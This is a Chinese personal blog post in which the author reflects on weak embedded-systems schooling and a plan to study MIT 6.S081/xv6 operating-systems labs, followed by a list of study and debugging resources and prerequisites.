<p>大三的时候学的微嵌（ARM的），当时讲的也水，大作业和实验也水（什么跑马灯驱动啊、ARM汇编啊，c内联汇编啊，还有一点FPGA），考试全都是抄书抄PPT写概念。深感当时学的太水了，走马观花看了一堆概念，实际上根本不会。</p>
<p>现在在实验室基本除了划水就是做一些CRUD的垃圾项目，什么XX管理系统，什么XX网站，什么基于机器学习的论文灌水；偶尔维护一下师兄师姐乱七八糟的祖传代码，感觉再这样虚度时光就要变成一个废人了，现在连c都生疏了。暂时打算从6.828和6.824开始，后面可能会做一点数据库的。</p>
<p>Verilog和VHDL这些暂时不打算再碰了，现在只想用c写。现在实验室有没有FPGA的板子，现在对RTL那些几乎也忘得差不多了，逻辑综合那些更别提了，本科那基本verilog的书当时疫情毕业也都送人了。</p>
<p>实验室已经两三年没人搞硬件了，堆在角落里的示波器和焊台也已经蒙了一层灰尘，罪过罪过。估计以后也没什么焊板子调运放的机会了.......</p>
<p>突然发现用go已经用习惯了，甚至感觉写go还挺舒服。。。用习惯了go的管道defer写close，写这个的时候老忘了close。<strong>而且我至少不下十次忘记末尾加分号<code>；</code>了</strong>，完了，写go写出肌肉记忆了。</p>
<p>（说起来Go写多了真是有点被惯坏了，现在再回去写c，手动管理内存和指针都觉得好麻烦，管道和进程也觉得不顺手。另一个非常非常难受的地方是，习惯了go很快的编译速度，现在每次等编译都好难受啊）</p>
<h2 id="参考和推荐">参考和推荐</h2>
<h3 id="链接">链接</h3>
<p>https://pdos.csail.mit.edu/6.828/2020/schedule.html <!-- 
https://www.cnblogs.com/fatsheep9146/p/5216681.html

https://www.cnblogs.com/fatsheep9146/category/769143.html

https://clownote.github.io/about/ --></p>
<p>xv6的资料</p>
<p>https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf</p>
<p>哈工大的课，跟6.S081前面几个lab差不多。</p>
<p>https://hitsz-lab.gitee.io/os_lab/</p>
<p>risc-v 资料</p>
<p>http://crva.ict.ac.cn/documents/RISC-V-Reader-Chinese-v2p1.pdf</p>
<p>调试：</p>
<p>https://twdlll.github.io/2020/11/10/6.S081-2/</p>
<p>https://zhuanlan.zhihu.com/p/166413604 clion调试</p>
<p>https://www.cnblogs.com/KatyuMarisaBlog/p/13727565.html vscode调试</p>
<h3 id="其他的一些推荐">其他的一些推荐</h3>
<p><em>The Linux Programming Interface: A Linux and UNIX System Programming Handbook</em>（中文版：《Linux/Unix系统编程手册》上下两册，下册翻译的很烂），相当不错的工具书，可以放在手边当参考书和工具书用。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvaW5kZXguaHRtbA==">Linux man pages online<i class="fa fa-external-link-alt"></i></span> 在线参考手册，必备</p>
<p>https://github.com/SI-RISCV/e200_opensource 没看过，据说还行。</p>
<p>现代操作系统</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9pcGFkcy5zZS5zanR1LmVkdS5jbi9tb3NwaS8=">《现代操作系统：原理与实现》<i class="fa fa-external-link-alt"></i></span> 上交IPADS的，我还没买。据说相当不错。（这本我自己一点也没看过，）</p>
<h3 id="前置工作">前置工作</h3>
<p>c语言， 大概弄懂k&amp;r那本<em>The C Programming Language</em>就可以开工了。当然，懂得越多越好，多多益善。</p>
<p><strong>菊巨可以用Rust哦，贵清<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Jjb3JlLW9zL3JDb3Jl">rCore<i class="fa fa-external-link-alt"></i></span>那边的课据说挺好的</strong>（群友们人均Rust, 就只本菜不会Rust了）</p>
<p>gdb等调试手段要熟， 没法调试等着两眼抓瞎吧。</p>
<p>熟悉链接库和编译那一套，Makefile什么的会用就行了。不熟悉编译的去编译个LFS（Linux from Scratch）就差不多了。</p>
<p>一些基础的书和知识，比如csapp等书可以先看看。</p>
<p>参考手册和工具书先备着，RISC-V的资料也备着。xv6有很多可以参考的地方。</p>
<p>xv6的资料在这里：https://pdos.csail.mit.edu/6.828/2020/xv6.html 这有一个中文的翻译：（版本略老，是x86的） https://github.com/ranxian/xv6-chinese</p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>6.S081</tag>
        <tag>xv6</tag>
      </tags>
  </entry>
</search>
